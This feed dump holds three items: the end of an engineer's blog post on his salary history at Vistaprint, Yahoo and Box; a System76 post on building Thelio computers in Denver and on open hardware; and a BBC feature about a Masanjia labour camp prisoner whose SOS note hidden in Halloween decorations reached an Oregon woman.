&lt;p&gt;My salary didn‚Äôt improve much there because the company was in perpetually poor financial health. There was a salary freeze in place almost the entire time I was there. I survived four rounds of layoffs. I was eventually ‚Äúpromoted‚Äù to the position of Senior Software Engineer, but it was a promotion in title only. There was no increase in salary (because of the salary freeze) and no change in my responsibilities (because the organization was weird). It was just a pat on the back to say, ‚Äúgood job, please don‚Äôt leave.‚Äù Spoiler alert: I left as soon as I could.&lt;/p&gt;
&lt;p&gt;Right before I left, I did get a salary increase to around $75,000. It wasn‚Äôt enough to make me want to stay.&lt;/p&gt;
&lt;p&gt;In terms of workload, once again I stuck pretty close to 40 hours per week and never worked a weekend. My commute, however, added three hours every day (1.5 hours each way). Adding in the commute time would make it 55 hours per week.&lt;/p&gt;
&lt;p&gt;This was the busiest time of my life, as I was not only working full time but was also writing my first book (nights and weekends) and going to school for my master‚Äôs degree (nights and weekends). I‚Äôm not quite sure how I ended up doing all of that, and managing a serious relationship with my then-partner, but somehow I made it through.&lt;/p&gt;
&lt;h3 id=&quot;vistaprint-2005-2006&quot;&gt;Vistaprint (2005-2006)&lt;/h3&gt;
&lt;p&gt;I often refer to my position at Vistaprint as my first real software engineering job. It was the first time I applied for a software engineering job without having a connection at the company; I just sent my resume in to their email address. I reported into the engineering organization (as opposed to the design organization in my prior jobs), and I got what I considered to be a good offer. The company was pre-IPO, and I was excited to get 3,000 stock options. (By this time, I actually understood what stock options were.)&lt;/p&gt;
&lt;p&gt;I don‚Äôt recall the starting salary but I suspect it was around $82,000 ($105,867 in 2018 dollars). I definitely recall the ending salary as $98,000 for a few reasons. First, I was complaining a lot about the boring project they had assigned me to so I expected that would eliminate me from any serious raise considerations. I was shocked to get a raise and even more shocked at the amount. Second, I was bummed they didn‚Äôt give me the extra $2,000 to make an even $100,000. Last, I was secretly interviewing with both Google and Yahoo, and upping my salary meant that I could use that number when it came time to talk compensation with them.&lt;/p&gt;
&lt;p&gt;I was only at Vistaprint for a little over a year before deciding to move to California to work for Yahoo. Vistaprint did go public while I was there, but since I left after a year, I didn‚Äôt see much from those stock options.&lt;/p&gt;
&lt;p&gt;The workload here was heavier but I still managed to stick to 40-45 hours per week. I don‚Äôt recall working any weekends, however, I do recall sometimes needing to work from home in the evening or early morning. All in all, though, the workload wasn‚Äôt that bad.&lt;/p&gt;
&lt;h3 id=&quot;yahoo-2006-2011&quot;&gt;Yahoo (2006-2011)&lt;/h3&gt;
&lt;p&gt;Yahoo‚Äôs initial offer was the best I had received up to that point. In addition to a $115,000 base salary ($143,833 in 2018 dollars), it included $10,000 signing bonus, 3,500 stock options, 1,500 RSUs, and relocation expenses. This was the first time I tried to negotiate for a higher starting salary and was summarily rejected. At least I tried.&lt;/p&gt;
&lt;p&gt;I ended up at Yahoo through a circuitous route. I had heard that Yahoo was using my first book, &lt;cite&gt;Professional JavaScript for Web Developers&lt;/cite&gt;, to teach JavaScript at the company. As such, I had an open invitation to stop by the campus if I was ever in the area. I had traveled to Mountain View to interview Google (they had found me through my second book, &lt;cite&gt;Professional Ajax&lt;/cite&gt;) and so reached out to the folks at Yahoo to meet up. I didn‚Äôt realize that conversation would turn into an invitation to apply to work at Yahoo as well.&lt;/p&gt;
&lt;p&gt;I don‚Äôt remember a lot of my pay details after I joined. Being at Yahoo for almost five years, I got several raises and two promotions, so my pay did keep increasing. All of that information was sent to my Yahoo corporate email address, and as such, I no longer have any of the documentation. That was intermixed with periods of layoffs and salary freezes. My initial stock options ended up worthless because the company stock price never again reached the level it was at when the options were priced. I would later get repriced stock options and more RSUs, but I don‚Äôt have specifics on that.&lt;/p&gt;
&lt;p&gt;By the time I left, I suspect I was making around $165,000 based on how I felt about the offer from Box.&lt;/p&gt;
&lt;p&gt;It‚Äôs worth noting that I left Yahoo to try to start a company with some friends and so didn‚Äôt have a regular salary for about 18 months.&lt;/p&gt;
&lt;p&gt;The workload at Yahoo varied based on the position I had at that time. When I first arrived at Yahoo, I was in a deep depression after moving across the country to a place where I didn‚Äôt know anyone. I found being alone in my apartment to be unbearable and so I would go into work early and leave late. Focusing on my work kept the bad thoughts out of my head and I really enjoyed working on My Yahoo, so it was a good mix. I was probably in the office from 9am to 7pm most days.&lt;/p&gt;
&lt;p&gt;Once I got more comfortable and started meeting people, I spent less time at the office and settled back into more of a 40-hour work week. Unfortunately, I also got more involved with writing and speaking, and those activities started to fill my nights and weekends. Before I knew it, I was basically working every day from the moment I woke up until the moment I went to sleep. Even though all of the work wasn‚Äôt Yahoo was paying me for, it was all the same type of work, so it all flowed together.&lt;/p&gt;
&lt;p&gt;The one thing I never did, though, was check my work email from home. I told everyone that leaving the office meant I was off the clock and the only way to reach me was to call me (I did give everyone my cell phone number). In my almost five years at Yahoo, I was only ever called once.&lt;/p&gt;
&lt;p&gt;There were several occasions when I had to work over the weekend, but my managers were very good about giving me that time back the next week. If I had to work over the weekend then I could choose the same number of days during the week to take off (I‚Äôd usually take Thursday and Friday the next week to get a long weekend).&lt;/p&gt;
&lt;h3 id=&quot;box-2013-2016&quot;&gt;Box (2013-2016)&lt;/h3&gt;
&lt;p&gt;My offer from Box was also strong. The starting salary of $175,000 ($189,415 in 2018 dollars) was more than enough to make me happy at the time, and the offer included 50,000 stock options. Box was pre-IPO so that high stock option allocation (which I was told was higher than what they usually gave people at my level) was a big consideration for me. I negotiated for a $25,000 signing bonus, as well.&lt;/p&gt;
&lt;p&gt;As part of my consulting business, I would regularly give talks at different companies. I agreed to give a talk for free at Box because a friend worked there and mentioned that they were having trouble managing their growing JavaScript code base. I spoke with a few people after the talk, including the VP of engineering, and we decided to explore if working at Box was a good fit for the company and me. Through several more discussions, it seemed like a good opportunity to get back into the stability of a regular salary with some interesting problems to tackle.&lt;/p&gt;
&lt;p&gt;My memory is a bit hazy around what happened between joining and the end of my time at Box as this was the period when my health was on a steep decline. I think I got one raise as a Staff Software Engineer about three months after I joined, and was informed of being promoted to Principal Architect six months after I joined (although I wouldn‚Äôt get the pay increase for another six months). I‚Äôm reasonably certain the promotion pay increase bumped me to $208,000. I recall clearly that I got one last raise to push me to $220,000 during 2014 because I had started working from home full time due to my health and I thought it was very nice of them to give me a raise regardless.&lt;/p&gt;
&lt;p&gt;At Box, I managed my workload very carefully due to my health. I started out at 40 hours per week but as my health declined, that number went down. I definitely dipped below that level later, but since we were evaluated on our impact rather than number of hours worked, I still got consistently positive reviews from my peers and manager. Box was also gracious enough to give me flexibility to work from home for two years, and even then, to work my own schedule as my health allowed. Ironically, it was my declining health that forced me to get smarter about how I worked and really keep my hours sane. I was also not spending time writing and speaking after the first year.&lt;/p&gt;
&lt;p&gt;I left Box when I was no longer physically able to work from home.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In my sixteen year career, I averaged a pay increase of $10,000 per year, even when taking into account several years of salary freezes at MatrixOne and Yahoo. As such, I suspect I‚Äôd be making around $250,000 if I was working full time today.&lt;/p&gt;
&lt;p&gt;It‚Äôs also important to understand that I never asked for a raise and only negotiated other details occassionally (as mentioned in the post). I never really felt comfortable with negotiations prior to working for myself, and generally was happy with the offers I received.&lt;/p&gt;
&lt;p&gt;With the exception of my one year at Vistaprint (during which I was a grouchy pain in the ass), I was consistently reviewed as a top performer at my position. I wasn‚Äôt put on any sort of improvement plan and most of my feedback had to do with improving interactions and communication with colleagues. And again, with the exception of Vistaprint (because‚Ä¶pain in the ass), I took the feedback to heart and worked to improve in those areas.&lt;/p&gt;
&lt;p&gt;Being single and not having a family to support throughout my entire career meant that I had more options. I could afford to take salary that was lower than what I wanted or could get elsewhere, and I could also afford to walk away from valuable stock options (such as with Vistaprint) to find a job that was more fulfilling. I recognize that not everyone has that option, so I think it‚Äôs important to make my situation clear here.&lt;/p&gt;
&lt;p&gt;I have two hopes from sharing this information. First, I hope that having this information will make it easier for women to understand how much they should be paid for similar work and just how their pay should be increasing throughout their career. Second, I hope that other men who are in a similarly independent position will also share their compensation history to benefit others.&lt;/p&gt;
&lt;p&gt;We can all be better if we‚Äôre willing to share.&lt;/p&gt;
&lt;h2 id=&quot;updates&quot;&gt;Updates&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;30-October-2018&lt;/strong&gt; - added in details about hours worked per week based on feedback.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;31-October-2018&lt;/strong&gt; - many people are sharing their salary histories on &lt;a href=&quot;https://news.ycombinator.com/item?id=18342996&quot;&gt;Hacker News&lt;/a&gt;.&lt;/li&gt;

<title>System76 on US Manufacturing and Open Hardware</title>
<link>https://blog.system76.com/post/179592732883/system76-on-us-manufacturing-and-open-hardware</link>
<guid isPermaLink="true" >https://blog.system76.com/post/179592732883/system76-on-us-manufacturing-and-open-hardware</guid>
<description>&lt;p&gt;We‚Äôve seen some confusion about what it means to be a US computer manufacturer and about open hardware. With the Thelio launch just around the corner, it‚Äôs a great time for us to add some clarity.¬†&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;We‚Äôve been working on the Thelio design for about three years. The philosophy around Thelio‚Äôs design was fourfold. The design should reflect our company character and culture, the design must support the maximum performance of the fastest available components, be easy to service and upgrade, and must represent the open source roots of System76. Early on, there was a lot of testing and experimentation. We engineered prototyping techniques to quickly iterate on ideas, optimize performance and thermal characteristics, and develop a strategy to open source as much functionality as possible.&lt;/p&gt;
&lt;p&gt;Eventually we were ready to move from acrylic prototypes to metal. Then we tried finding factory space in Colorado. That was much harder than expected and it took a full year.¬†&lt;/p&gt;
&lt;p&gt;We moved an eight-person engineering and operations team over in March of this year and the rest of the team a few months later. We began converting the design from prototype to production. At our facility, we take in US-sourced sheet metal, aluminum extrusions, and other raw materials. We use production machinery to cut it, bend it, powder coat, etch, and then assemble the parts together along the way to producing the final product. We use components that we source outside the US, like the motherboard, memory, and drives to assemble orders to the customers‚Äô needs. Technically, Thelio is ‚ÄúDesigned and manufactured in the US with domestic and foreign components‚Äù.¬†¬†&lt;/p&gt;
&lt;p&gt;We‚Äôve seen it argued that this isn‚Äôt US manufacturing because every part isn‚Äôt made in the US. If we sourced every part externally, this would be called ‚Äúassembled in the US.‚Äù That‚Äôs not what we‚Äôre doing here. We‚Äôre transforming raw materials into a final product. The work that goes into this kind of production is complex and expensive. That‚Äôs why the location where the final substantial transformation occurs is considered the place of manufacture and the country of origin. For Thelio, that happens in Denver.¬†&lt;/p&gt;
&lt;p&gt;Building a factory was a massive step for us. This is the only way to excel as a company. For starters, it enables us to respond more rapidly to our customer‚Äôs needs. Additionally, bringing manufacturing in-house helps us reach the end goal: to build an open computer.¬†Internal design and manufacturing is the strategy that we think is most plausible to reach the completely open computer.¬†&lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/0029d9beab26970a89176e703c5389f8/tumblr_inline_phf9l8FF9D1txpgep_500.png&quot; data-orig-width=&quot;749&quot; data-orig-height=&quot;183&quot; width=&quot;500&quot; height=&quot;122&quot; alt=&quot;image&quot;/&gt;&lt;p&gt;A completely open computer includes every part and component. The computer case, the motherboard, the drives, the memory, the cabling, the buttons, the ports, etc. The strictest definition of an open computer is that every single part of the product has openly licensed design files, schematics, and code. No one is there yet. We all understand that it‚Äôs not practical to start at the end. So we‚Äôre chipping away at the proprietary bits. There‚Äôs a lot of work to do. Those of us working to build open computers are taking different approaches and in doing so we all contribute toward this end. The important thing is that we‚Äôre all on the same trajectory. There‚Äôs a massive market out there that‚Äôs dominated by companies that don‚Äôt care about making open source hardware. We must make better products than they do if we are to turn that tide.¬†&lt;/p&gt;
&lt;p&gt;So, what makes Thelio open hardware? The Thelio design we‚Äôve worked on for three years is open source. That means anyone can study, modify, distribute, make, and sell the design. You can send the design files to a metal shop to make your own Thelio. You can adapt the design for your needs. Open source hardware is the physical version of open source software. We believe it‚Äôs important to apply the same passion we have about software freedom to the hardware itself. The open hardware community is young and small compared to open source software. We hope adding Thelio and Thelio Io to the ranks of open hardware will encourage others to join the movement and make their designs free as well. We‚Äôre very excited to see what people will do with free hardware designs. This is relatively new territory.¬†&lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/a079c4a810ed418dba5ba8376759fb4f/tumblr_inline_phf9rgjudI1txpgep_500.png&quot; data-orig-width=&quot;948&quot; data-orig-height=&quot;218&quot; width=&quot;500&quot; height=&quot;115&quot; alt=&quot;image&quot;/&gt;&lt;p&gt;To further our open computer ambition, we‚Äôre working to remove functionality from the proprietary mainboard. To that end, we designed Thelio Io, a daughter board that manages thermal and chassis control while also providing a storage backplane for the drives in Thelio. It‚Äôs open hardware and open source firmware, and a big step in the right direction. We‚Äôre by no means done. We‚Äôll continue to open source more functionality. Eventually, all that will be left are proprietary hardware initialization bits and convincing Intel and AMD to open up there. We think there‚Äôs reason for optimism. Intel contributes lots of code to Linux and AMD graphics drivers are open source already. Maybe open hardware is next for them. Let‚Äôs keep pushing.¬†&lt;/p&gt;
&lt;p&gt;This is just the start for us. Next, we move to designing laptops with open hardware designs and controllers. An open source keyboard? We‚Äôd love to make one. Motherboards? We‚Äôll experiment there too. ¬†Having a factory opens up all kinds of possibilities. It‚Äôll take time and a lot of work, but we sure like where we‚Äôre headed.&lt;/p&gt;

<title>The SOS in my Halloween decorations</title>

        &lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;Inside a notorious Chinese labour camp, a dissident smuggled an SOS letter into the Halloween decorations he was forced to manufacture. Years later, a woman in the US opened a box of fake tombstones and found his note. It seemed impossible at that moment that they would ever meet.&lt;/p&gt;&lt;p&gt;A few years ago, as the evenings began getting colder and darker, Julie Keith remembered the graveyard kit in her loft.&lt;/p&gt;&lt;p&gt;She'd picked it up for $29.99 from the supermarket chain, Kmart, a couple of years before that. It contained polystyrene headstones, fake skulls and bones, black spiders and a cloth drenched in imitation blood.&lt;/p&gt;&lt;p&gt;It had been gathering dust in the loft ever since. But when her daughter told her she wanted a Halloween-themed fifth birthday party, Julie, then 42, thought of the kit and went upstairs to fetch it.&lt;/p&gt;&lt;p&gt;Then, as she opened the box in her living room, a sheet of lined paper fell out. &lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                 &lt;span class=&quot;story-image-copyright&quot;&gt;Flying Cloud Productions&lt;/span&gt;
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;On it was a message, neatly hand-written in blue ink. Julie's daughter picked it up and asked her to read it. The English was broken and frequently mis-spelt, but its meaning was clear enough.&lt;/p&gt;&lt;p&gt;&quot;Sir,&quot; it began. &quot;If you occassionally buy this product, please kindly send this letter to the World Human Right Organization. Thousands people here who are under the persicution of the Chinese Communist Party Government will thank and remember you forever.&quot;&lt;/p&gt;&lt;p&gt;Julie read on. The note said that the graveyard kit had been produced in unit eight, department two of Masanjia labour camp in Shenyang, China. Inmates there had to work there for 15 hours a day seven days a week: &quot;Otherwise, they will suffer torturement, beat and rude remark. Nearly no payment (10 yuan/1 month).&quot;  Today 10 yuan is roughly equivalent to ¬£1.10 or US$1.44.&lt;/p&gt;&lt;p&gt;Prisoners were detained on average for one to three years without a formal court sentence, the note continued. Some of them belonged to the spiritual movement Falun Gong. &quot;They often suffer more punishment than others,&quot; the note said.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;There was no signature at the end.&lt;/p&gt;&lt;p&gt;&quot;I was kind of in shock,&quot; Julie says. &quot;I just couldn't believe that something like that was here, in front of me.&quot;&lt;/p&gt;&lt;p&gt;It seemed miraculous that this scrap of paper had travelled thousands of miles to her home in Damascus, near Portland, in the US state of Oregon, and then languished in her home for two years until 2012. She tried to imagine how desperate its author must have felt, how much courage it must have taken to slip it in among the decorations.&lt;/p&gt;&lt;p&gt;Julie, a manager at the Goodwill thrift store chain, knew nothing at all about this person, but it was obvious to her that he or she desperately wanted the world to know what was happening at Masanjia.&lt;/p&gt;&lt;hr class=&quot;story-body__line&quot;/&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;Find out more&lt;/h2&gt;&lt;p&gt;Julie Keith and Leon Lee were speaking to Outlook on the BBC World Service&lt;/p&gt;&lt;p&gt;You can listen again &lt;a href=&quot;https://www.bbc.co.uk/programmes/w3cswl56&quot; class=&quot;story-body__link&quot;&gt;here&lt;/a&gt;&lt;/p&gt;&lt;hr class=&quot;story-body__line&quot;/&gt;&lt;p&gt;Julie didn't know where to begin, so she logged on to Facebook and asked for advice.&lt;/p&gt;&lt;p&gt;She took a photo of the note and posted it for her friends to see. They suggested that she contact human rights organisations, so Julie rang up and left messages with several - but she never received a reply. &lt;/p&gt;&lt;p&gt;Still, Julie didn't give up. She took the letter into work and showed it to her company's PR manager, who contacted a journalist on The Oregonian, a local newspaper. The paper sent an intern to interview Julie - but for a couple of months, once again, there was silence. &lt;/p&gt;&lt;p&gt;Then suddenly, just before Christmas 2012, the story finally ran. It was on The Oregonian's front page, and immediately Julie's phone started ringing.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;TV networks and newspapers from around the world were asking her to speak - she found herself at the centre of a major international story. &lt;/p&gt;&lt;p&gt;Julie was delighted at first. She'd helped to spread the word about conditions in Masanjia, just as the note's author had asked. But then she read the comments below the online news reports.&lt;/p&gt;&lt;p&gt;Many strongly criticised her. By releasing the note in full - with its reference to the exact unit and department of the labour camp in which the author was held - she'd made a serious error, these commenters said. Surely now the whistleblower would be identified by the authorities and singled out for extra punishment?&lt;/p&gt;&lt;p&gt;&quot;It crushed me,&quot; Julie says. &lt;/p&gt;&lt;p&gt;&quot;I felt like, at that point, I maybe had done the wrong thing. I felt terrible but I just kept referring back to the letter - this is what the writer wanted. He wanted me to publicise this.&quot;&lt;/p&gt;&lt;p&gt;The self-doubt kept nagging at Julie, however. But then, in mid-2013, she was contacted by the New York Times. The author of the note slipped in among the Halloween tombstones and skulls had been tracked down. And he had a message for her.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;Five years earlier, Sun Yi looked out of a window into the darkness as he ate his meagre dinner at Masanjia prison camp, and saw a group of people moving through the gloom outside. He couldn't see well, but they appeared to be carrying human skulls and thigh bones.&lt;/p&gt;&lt;p&gt;Sun Yi was horrified. He'd only recently been sentenced but already he'd heard rumours that some of his fellow inmates were tortured to death. This appeared to be confirmation.&lt;/p&gt;&lt;p&gt;Another inmate told him the group he'd seen were known as the Eighth Team, and they worked on what was called the &quot;ghost job&quot;.&lt;/p&gt;&lt;p&gt;Not long afterwards, in June 2008, a guard called out Sun Yi's name. He was taken to a building and sent to a room on the fourth floor. He realised he'd been assigned to the Eighth Team - the very last thing he had wanted to happen.&lt;/p&gt;&lt;p&gt;When he entered the room, Sun Yi saw what looked like a tombstone in front of him. He picked it up and realised it was made of white polystyrene. It would soon be covered in black dye, and it would be Sun Yi's job to make it look old by rubbing it with a wet sponge until the white underneath began to show through.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;Sun Yi had no idea what Halloween was, though it came as a great relief that no actual dead bodies were involved - it was baffling to him that anyone would want these morbid decorations. &lt;/p&gt;&lt;p&gt;&quot;He was wondering why people would buy this kind of scary stuff,&quot; says Canadian film-maker Leon Lee, who would later get to know Sun Yi. &quot;Until one day a guard told him Western people have this kind of a culture, a so-called festival, and that's why they are making it.&quot;&lt;/p&gt;&lt;p&gt;Soon black dye covered Sun Yi's face and body. He worked from 04:00 until 23:00 or midnight, breaking only to eat. At night, he later recalled, his hands would move as he slept, as if he was polishing tombstones in his dreams.&lt;/p&gt;&lt;p&gt;Before his arrest, Sun Yi had been an engineer for an oil and gas company. His troubles began after a chance meeting with a group of people exercising outdoors near his home in Beijing - they were practising Falun Gong, a spiritual movement loosely based on Taoism and Buddhism, and Sun Yi soon joined up.&lt;/p&gt;&lt;p&gt;Falun Gong was initially tolerated by China's communist authorities after its emergence in the early 1990s, but after a few years they began to see the movement as potential threat, because of its growing size. Criticisms began to appear in the state media, prompting some 10,000 practitioners to take part in a silent protest outside the ruling Communist Party's Beijing headquarters in 1999. The movement was banned soon after that.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                    Falun Gong practitioners outside Hong Kong government offices in 1999
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The Chinese government then launched a relentless publicity campaign against Falun Gong, branding it an &quot;evil cult&quot;. Its followers soon had to practise in secret, risking prosecution and arrest. &lt;/p&gt;&lt;p&gt;In February 2008, during a crackdown in the run-up to the Beijing Olympics, Sun Yi was caught. Arrested during a raid at an underground press, he was sentenced to two-and-a-half years in prison.&lt;/p&gt;&lt;p&gt;That is when he was taken to Masanjia, a &quot;re-education through labour&quot; camp in the north-east of the country that housed criminals as well as dissidents and political prisoners.&lt;/p&gt;&lt;p&gt;While he was there, his wife wrote to him telling him she wanted a divorce. She and other relatives had been harassed and detained following his arrest, and she knew that members of her family would fail background checks - and therefore be unable to get jobs - as long as she was married to him.&lt;/p&gt;&lt;p&gt;Sun Yi held on to the letter. It was the only thing in Masanjia that was his.&lt;/p&gt;&lt;p&gt;Around this time, an idea occurred to him. He knew the graveyard kits he was making were for export because the labels were in English. Why not write letters and hide them inside the boxes? Maybe someone would find one and tell the world what was happening in Masanjia?&lt;/p&gt;&lt;p&gt;One night, as he lay in his cell surrounded by 30 or 40 sleeping fellow inmates, Sun Yi turned on his side so that he faced the wall. All he could hear were the crickets chirping outside. Quietly, he opened a sheet of paper and pulled out a pen. He knew that guards were on patrol.&lt;/p&gt;&lt;p&gt;He picked up his pen and began to write.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;El Toro Studios&lt;/span&gt;
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;Sun Yi later estimated he had written about 20 letters in total during his time at Masanjia. He had to be careful about slipping them into the tombstone kits because he never knew which ones would be inspected. He usually did it during breaks, when other prisoners were outside.&lt;/p&gt;&lt;p&gt;But once, as he put a letter into a box, another inmate saw what he was doing. Sun Yi had to take a risk and tell him what he was up to.&lt;/p&gt;&lt;p&gt;&quot;Good,&quot; said the other prisoner. &quot;Do you have any more that I could help you hide?&quot;&lt;/p&gt;&lt;p&gt;Sun Yi began sharing his letters with other Falun Gong devotees inside the camp, and one night one of the notes was discovered by guards during a search. The guards tortured the prisoner on whom the letter was found - they knew he must have an accomplice, because he didn't speak English. But he didn't reveal Sun Yi's involvement.&lt;/p&gt;&lt;p&gt;Although Sun Yi escaped further punishment on that occasion, he didn't manage to evade the next crackdown against Falun Gong prisoners. Like many others, he was forced to stand with his wrists handcuffed to a bunk bed in an effort to make him recant. If he fell asleep, his legs would give way and the handcuffs would cut into him like knives.  &lt;/p&gt;&lt;p&gt;Sun Yi was released from Masanjia in September 2010.  He carried on practising Falun Gong and printing samizdat literature, but he kept a low profile. And then in 2012, while browsing Western news sites on the internet - he'd found a way to bypass China's censorship of the web - he came across a story about a letter that had been found among a box of Halloween decorations in Oregon. His letter.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                    Sun Yi outside Masanjia after his release
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Four months after the story about Julie's Halloween decorations went viral, a Chinese magazine called Lens published an expose about conditions inside Masanjia. The online version of the story was later deleted, but the Chinese authorities appear to have been shaken by the publicity. Shortly afterwards the government announced that it was ending the &quot;education through labour&quot; system and freeing some 160,000 prisoners.&lt;/p&gt;&lt;p&gt;It was not long after this that Julie heard Sun Yi - indirectly at first. &quot;The New York Times contacted me and told me that they had been in contact with him and that &lt;a href=&quot;https://www.nytimes.com/2013/06/12/world/asia/man-details-risks-in-exposing-chinas-forced-labor.html?smid=nytcore-ios-share&quot; class=&quot;story-body__link-external&quot;&gt;they were doing a story&lt;/a&gt;,&quot; she says. He'd written another letter - this time, it was just for her. In it, he wrote &quot;that he was very glad that I publicised the letter - that's exactly what he wanted&quot;, Julie remembers. &lt;/p&gt;&lt;p&gt;&quot;I was so thrilled - to know that he was alive, for one, and that he was proud of me and just knowing that I did the right thing.&quot;&lt;/p&gt;&lt;p&gt;Sun Yi had not only been contacted by the New York Times, but also by Leon Lee, a Canadian director with a record of covering human rights abuses in China. Sun Yi agreed to be the subject of a film and began sending Lee footage of himself. &lt;/p&gt;&lt;p&gt;He understood this was an enormous risk. &lt;/p&gt;&lt;figure class=&quot;media-portrait no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;He and his ex-wife were planning to remarry and leave China together, but then a fresh crackdown on Falun Gong practitioners began. Police raided Sun Yi's ex-wife's home and told her to contact them if she saw Sun Yi. Before long, Sun Yi was arrested.&lt;/p&gt;&lt;p&gt;While he was in custody, though, his health began to deteriorate, so he was released on health grounds - and he took the opportunity to flee to Jakarta, the capital of Indonesia, with help from Leon Lee.&lt;/p&gt;&lt;p&gt;Life was tough there. Sun Yi applied for refugee status, but as an asylum seeker he was unable to work. He couldn't contact his wife for fear of getting her into trouble with the Chinese authorities. Living off his savings, he spent his days learning Indonesian and English. &lt;/p&gt;&lt;p&gt;It was at this point that Julie flew out to meet Sun Yi. Lee, who'd put them in touch, would be there to film the encounter. Julie had worried about him constantly during the four years that had passed since she'd found his letter. She had heard some of Sun Yi's story from Lee, and was troubled by the thought that she had contributed to his difficulties.&lt;/p&gt;&lt;p&gt;When she arrived at his modest apartment in Jakarta, she didn't know what to expect. &lt;/p&gt;&lt;p&gt;&quot;It was like we had this instant connection,&quot; says Julie.&lt;/p&gt;&lt;p&gt;&quot;He called me his sister. It was like we'd known each other forever.&quot;&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;They exchanged gifts. He bought her flowers, while she bought him a book about life in Oregon. She also brought him the note he had written in Masanjia, and the polystyrene tombstone. &quot;He seemed really thankful to bring all this back full circle,&quot; Julie says.&lt;/p&gt;&lt;p&gt;He asked her about the festival of Halloween. What happened to the pumpkins after they were carved, Sun Yi wondered. Did you eat them? Julie explained this wasn't the custom. He also wanted to know what &quot;RIP&quot; stood for. Rest in Peace, Julie told him. She explained that it was a message of goodwill for the dead.&lt;/p&gt;&lt;p&gt;After she'd flown home, Sun Yi wept when he recalled Julie's visit. He had never imagined she would travel all that way to see him. &quot;I really appreciate that she did that,&quot; he tells Leon Lee, in an interview on camera. &quot;I don't know how to thank her. She feels like family.&quot;&lt;/p&gt;&lt;p&gt;But if life in Jakarta was hard, it soon got worse. Shortly after Julie's visit, Sun Yi was contacted by a suspected Chinese agent - and two months later he died of acute kidney failure. Despite a request from his ex-wife and sisters, there was no investigation into the cause of death. Leon is suspicious: &quot;He had no kidney problems before and when I was there in Indonesia he seemed perfectly healthy.&quot;&lt;/p&gt;&lt;p&gt;Julie was devastated when she heard the news. &quot;I so badly wanted a happy ending for him,&quot; she says. &lt;/p&gt;&lt;p&gt;She feels honoured to have known Sun Yi. &quot;He was the most resilient, strong person I have ever met - for someone to go through what he did and come out and be able to talk about it and share his experiences with the world - it's just incredible.&quot;&lt;/p&gt;&lt;p&gt;Her chance connection with Sun Yi changed her life, she says. She became more globally aware - conscious of where the products in the dollar stores near her home had come from, and she resolved to pass on this understanding to her children.&lt;/p&gt;&lt;p&gt;For human rights campaigners, the relevance of Sun Yi's story hasn't diminished. When the re-education through labour system formally ended, Amnesty International said many camps were simply renamed prisons or rehabilitation centres, and that dissidents and Falun Gong followers continued to be held in them, often without trial. Torture remained &quot;widespread&quot; in cases considered politically sensitive, including those of Falun Gong practitioners, the organisation &lt;a href=&quot;https://www.amnesty.org/download/Documents/ASA1727302015ENGLISH.PDF&quot; class=&quot;story-body__link-external&quot;&gt;reported in 2015&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Recently, China has been accused of locking up hundreds of thousands of Muslims without trial in its western region of Xinjiang. The government denies the claims, but &lt;a href=&quot;https://www.bbc.co.uk/news/resources/idt-sh/China_hidden_camps&quot; class=&quot;story-body__link&quot;&gt;a BBC investigation found significant new evidence of internment camps&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;i&gt;Leon Lee's film &lt;/i&gt;&lt;a href=&quot;http://www.letterfrommasanjia.com/&quot; class=&quot;story-body__link-external&quot;&gt;Letter from Masanjia&lt;/a&gt;&lt;i&gt; received its UK premier at the Cambridge International Film Festival on 26 October.&lt;/i&gt;&lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;You may also be interested in 'Meet me on the bridge': &lt;/h2&gt;&lt;figure class=&quot;media-with-caption&quot; 